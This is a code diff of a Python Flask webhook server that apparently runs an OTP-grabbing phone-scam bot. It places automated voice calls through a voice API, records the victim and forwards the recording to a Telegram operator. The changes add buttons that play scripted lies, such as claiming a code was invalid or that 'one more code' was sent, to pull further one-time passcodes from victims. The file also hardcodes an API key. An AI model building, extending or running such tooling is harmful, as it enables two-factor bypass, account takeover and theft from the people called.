@@ -35,7 +35,8 @@ def call(chat_id,name):
     else:
         return "Invalid data.", 400
     if data['status'] == "call.ringing":
-            callback_accept = json.dumps({"action": "endcall", "sid": callsid})
+            cca = str(callsid +"$"+ chat_id)
+            callback_accept = json.dumps({"action": "endcall", "sid": cca})
 
             keyboard = [
                 [
@@ -55,20 +56,6 @@ def call(chat_id,name):
             print(response.json()) 
 
             return "Any Response."
-    elif 'recordingurl' in data:
-        response = requests.get(data['recordingurl'])
-        payload = {
-            'chat_id': chat_id,
-            'title': 'transcript.wav',
-            'parse_mode': 'HTML'
-        }
-        files = {
-            'audio': response.content,
-        }
-        requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
-            data=payload,
-            files=files)
-        return "Any Response."
     elif data['status'] == "call.answered":
         base_url = "https://api.jokerapi.co/voice/v1/gathertext"
         apikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
@@ -89,11 +76,26 @@ def call(chat_id,name):
             r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 🔔 Voicemail Detected")
             return "Any Response."
     elif data['status'] == "call.ended":
-        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📵 Call has been hangup.")
+        if 'recordingurl' in data:
+            response = requests.get(data['recordingurl'])
+            payload = {
+                'chat_id': chat_id,
+                'title': 'transcript.wav',
+                'parse_mode': 'HTML'
+            }
+            files = {
+                'audio': response.content,
+            }
+            requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
+                data=payload,
+                files=files) and requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📞 Call has been hangup.")
+            return "Any Response."
+        r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📵 Call has been hangup.")
         return "Any Response."
     elif data['status'] == "dtmf.entered":
         r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📞 DTMF Entered")
         return "Any Response."
+
     elif 'digits' in data:
         if data['digits'] == "1":
             print(data["digits"])
@@ -107,9 +109,8 @@ def call(chat_id,name):
             r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📲 Send OTP..")
 
             print("Response:", response.json())
-        else:
+        elif len(data['digits']) == 6:
             otp2 = data["digits"]
-            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ ✅ OTP Code: {otp2}")
             print(data["digits"])
             base_url = "https://api.jokerapi.co/voice/v1/playtext"
             apikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
@@ -119,14 +120,17 @@ def call(chat_id,name):
             url = f"{base_url}?apikey={apikey}&callsid={callsid1}&text={text}&voice={voice}"
             response = requests.get(url)
             chat_id1 = str(chat_id)
-            callback_accept = json.dumps({"action": "1", "sid": callsid})
-            callback_decline = json.dumps({"do": "yep", "sid": callsid})
+            cca = str(callsid1 +"$"+ chat_id1)
+            callback_accept = json.dumps({"action": 1, "sid": cca })
+            callback_decline = json.dumps({"action": 2, "sid": cca})
+            callback_more = json.dumps({"action": 3, "sid": cca})
             print (callback_accept)
             keyboard = [
                 [
 
                     {"text": "accept", "callback_data": callback_accept},
-                    {"text": "decline", "callback_data": callback_decline},
+                    {"text": "more", "callback_data": callback_more},
+                    {"text": "reject", "callback_data": callback_decline},
                 ],
             ]
 
@@ -141,37 +145,54 @@ def call(chat_id,name):
             print(response.json())            
         return "Any Response."
 
-        
+            
     else:
         return "Unhandled status.", 400
 @app.route('/otp', methods=['POST'])
 def handle_update():
     data = request.get_json()
     print(data)
+    callsid, chat_id1 = data['sid'].split('$')
     action = data.get('action')  # Get the value of 'action' key, or None if it doesn't exist
-    callsid = data.get('sid')
-    if action == '1' :
+
+    print(chat_id1)
+    if action == 1 :
             base_url = "https://api.jokerapi.co/voice/v1/playtext"
             apikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
-            callsid1 = data['sid']
-            #chat_id = data['chat_id']
-            text = "Thank you the code is valid"
+            callsid1 = callsid
+            text = "Thank you, the code is valid"
             voice = "ai3-Jenny"
             url = f"{base_url}?apikey={apikey}&callsid={callsid1}&text={text}&voice={voice}"
             response = requests.get(url) 
-            #r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ code accepted")
+            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=├ code accepted")
     elif action == 'endcall' :
             base_url = "https://api.jokerapi.co/voice/v1/hangup"
             apikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
-            callsid1 = data['sid']
+            callsid1 = callsid
             url = f"{base_url}?apikey={apikey}&callsid={callsid1}"
             response = requests.get(url)
-    elif data.get('do') == 'yep' :  
-        sid = data.get('sid')
-        decline_endpoint = f'/decline/{sid}'
-        response = requests.post(f'https://c4e2-178-77-177-153.ngrok-free.app{decline_endpoint}')  # Change the URL to match your server's address
-        print("Response from /decline endpoint:", response.status_code)
+    elif action == 2 :  
+        base_url = "https://api.jokerapi.co/voice/v1/gathertext"
+        apikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
+        callsid1 = callsid
+        text = f"the code you entered is not valid , please enter the code again"
+        voice = "ai3-Jenny"
 
+        url = f"https://api.jokerapi.co/voice/v1/gathertext?apikey={apikey}&callsid={callsid1}&text={text}&voice={voice}&maxdigits=6"
+
+        response = requests.get(url)
+        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=├ code rejected")
+    elif action == 3 :  
+        base_url = "https://api.jokerapi.co/voice/v1/gathertext"
+        apikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
+        callsid1 = callsid
+        text = f"Thank you , but for more security we have sent you one more code , please enter it"
+        voice = "ai3-Jenny"
+
+        url = f"https://api.jokerapi.co/voice/v1/gathertext?apikey={apikey}&callsid={callsid1}&text={text}&voice={voice}&maxdigits=6"
+
+        response = requests.get(url)
+        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=├ asked for more code")
 
     return 'ok'
 @app.route('/decline/<sid>', methods=['POST'])
